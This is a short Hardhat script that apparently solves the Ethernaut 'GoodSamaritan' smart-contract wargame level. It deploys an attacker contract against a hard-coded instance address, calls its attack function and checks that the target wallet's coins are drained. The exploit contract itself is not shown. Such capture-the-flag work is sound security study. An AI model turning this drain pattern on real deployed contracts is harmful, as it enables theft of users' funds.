const { Wallet } = require("ethers")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let power, tx, res, token1bal, token2bal
    let attacker = new Wallet(process.env.METAMASK_PRIVATE_KEY, ethers.provider)
    let instanceAddress = "0xCC6a0e0325ACDC2b4D4069030cAB74dF949D884e"
    // Contracts
    let target = await ethers.getContractAt(
        "GoodSamaritan",
        instanceAddress,
        attacker
    )

    let attackerContractFactory = await ethers.getContractFactory(
        "GoodSamaritanAttacker",
        attacker
    )

    let attackerContract = await attackerContractFactory.deploy(target.address)

    let coin = await ethers.getContractAt("Coin", await target.coin(), attacker)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Samaritan address ${target.address}`)
    console.log(`Attacker contract deployed at ${attackerContract.address}`)

    // Attack
    await attackerContract.attack({ gasLimit: 1000000 })

    // Check
    let remainingBal = await coin.balances(await target.wallet())
    if (remainingBal == "0") {
        console.log(`${symbols.success} Drained Samaritan!`)
    } else {
        console.log(
            `${symbols.error} Samaritan still has ${remainingBal} coins`
        )
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
